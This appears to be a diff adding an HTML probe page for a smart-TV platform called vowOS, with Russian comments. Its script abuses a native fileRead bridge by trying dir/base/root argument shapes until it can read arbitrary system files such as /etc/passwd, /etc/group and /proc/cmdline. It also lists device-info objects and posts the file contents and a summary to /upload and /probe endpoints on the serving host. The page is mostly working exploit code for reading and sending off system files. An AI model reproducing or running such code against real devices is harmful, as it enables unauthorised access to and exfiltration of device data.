@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>tv fileRead probe</title>
+<style>
+ body{font:17px/1.35 sans-serif;background:#111;color:#eee;margin:0;padding:18px}
+ h1{font-size:19px;margin:0 0 8px}
+ #log{white-space:pre-wrap;font-family:monospace;font-size:13px}
+ .ok{color:#6f6}.bad{color:#f66}.dim{color:#888}
+</style>
+</head>
+<body>
+<h1>fileRead / tvapi probe <small class="dim">read-only</small></h1>
+<div id="log"></div>
+<script>
+/* Шаг 2. У fileRead вызов {path:"/etc/passwd"} дал ENOENT на "undefined/etc/passwd":
+   значит служба склеивает args.dir + args.path. Подбираем имя ключа базы,
+   а найдя рабочую форму — сразу читаем пачку файлов. Только чтение. */
+var API = "";
+var log_lines = [], tests = [];
+var FILES = ["/etc/version", "/etc/passwd", "/etc/group", "/etc/hosts", "/etc/inittab",
+             "/proc/version", "/proc/cmdline", "/proc/mounts", "/etc/os-release"];
+
+function log(msg, cls) {
+  var el = document.getElementById("log");
+  var d = document.createElement("div");
+  if (cls) d.className = cls;
+  d.textContent = msg;
+  el.appendChild(d);
+}
+function post(path, obj, cb) {
+  try {
+    var x = new XMLHttpRequest();
+    x.open("POST", API + path, true);
+    x.setRequestHeader("Content-Type", "application/json");
+    x.onreadystatechange = function () { if (x.readyState === 4 && cb) cb(x.status); };
+    x.send(JSON.stringify(obj));
+  } catch (e) { if (cb) cb(0); }
+}
+function short(v, n) {
+  try { var s = (typeof v === "string") ? v : JSON.stringify(v); return s.slice(0, n || 260); }
+  catch (e) { return String(v).slice(0, 160); }
+}
+function call(api, args) {
+  try { return window.HiUtils_createRequest(api, args); }
+  catch (e) { return { thrown: String(e && e.message || e) }; }
+}
+function rel(p) { return String(p).replace(/^\/+/, ""); }
+
+/* ---------- 1. подбор формы аргумента ---------- */
+var shapes = [
+  ["dir=/ path=rel",   function (p) { return call("fileRead", { dir: "/", path: rel(p) }); }],
+  ["dir=/etc path=x",  function (p) { return call("fileRead", { dir: "/etc", path: p.split("/").pop() }); }],
+  ["base=/ path=rel",  function (p) { return call("fileRead", { base: "/", path: rel(p) }); }],
+  ["root=/ path=rel",  function (p) { return call("fileRead", { root: "/", path: rel(p) }); }],
+  ["baseDir=/ p=rel",  function (p) { return call("fileRead", { baseDir: "/", path: rel(p) }); }],
+  ["folder=/ path=rel",function (p) { return call("fileRead", { folder: "/", path: rel(p) }); }],
+  ["dir='' path=abs",  function (p) { return call("fileRead", { dir: "", path: p }); }],
+  ["path+prefix",      function (p) { return call("fileRead", { prefix: "/", path: rel(p) }); }],
+  ["src=/ path=rel",   function (p) { return call("fileRead", { src: "/", path: rel(p) }); }],
+  ["url=file:///",     function (p) { return call("fileRead", { url: "file://" + p }); }]
+];
+var WORKING = null;
+for (var i = 0; i < shapes.length; i++) {
+  var name = shapes[i][0], fn = shapes[i][1];
+  var r = fn("/etc/version");
+  var rec = { shape: name, result: short(r, 300) };
+  tests.push(rec);
+  log((r && r.ret ? "ok   " : "fail ") + name + " -> " + rec.result, r && r.ret ? "ok" : "bad");
+  if (r && r.ret) { WORKING = { name: name, fn: fn }; break; }
+}
+
+/* ---------- 2. окружение vowOS ---------- */
+function keysOf(o, n) { try { var a = []; for (var k in o) { a.push(k); if (a.length >= (n || 40)) break; } return a; } catch (e) { return "err:" + e; } }
+var env = {
+  tvinfoKeys: keysOf(window.vowOS && window.vowOS.tvinfo),
+  storeKeys: keysOf(window.vowOS && window.vowOS.store),
+  tvinfoSrc: (function () { try { return Object.keys(window.vowOS.tvinfo).slice(0, 12).map(function (k) { return k + ":" + (typeof window.vowOS.tvinfo[k]); }).join(","); } catch (e) { return String(e); } })()
+};
+log("vowOS.tvinfo: " + env.tvinfoSrc, "dim");
+
+/* ---------- 3. чтение пачки файлов рабочей формой ---------- */
+function readAll() {
+  var idx = 0;
+  function next() {
+    if (idx >= FILES.length) return finish();
+    var p = FILES[idx++];
+    var r = WORKING.fn(p);
+    var payload = {
+      path: p, type: "file", strategy: "hiutils/" + WORKING.name,
+      status: (r && r.ret) ? "ok" : "error",
+      data: (r && r.ret) ? short(r.msg, 200000) : null,
+      error: (r && r.ret) ? null : short(r, 200)
+    };
+    log((payload.status === "ok" ? "ok   " : "err  ") + p + " (" + (payload.data ? payload.data.length : 0) + " B)", payload.status === "ok" ? "ok" : "bad");
+    post("/upload", payload, function () { setTimeout(next, 120); });
+  }
+  next();
+}
+
+function finish() {
+  post("/probe", { name: "fileread2", userAgent: navigator.userAgent, shapes: tests, env: env, working: WORKING && WORKING.name }, function (st) {
+    log(st === 200 ? "готово, можно закрывать" : "ошибка отправки " + st, st === 200 ? "ok" : "bad");
+  });
+}
+
+if (WORKING) { log("рабочая форма: " + WORKING.name, "ok"); readAll(); }
+else { log("ни одна форма не дала ret:true", "bad"); finish(); }
+</script>
+</body>
+</html>
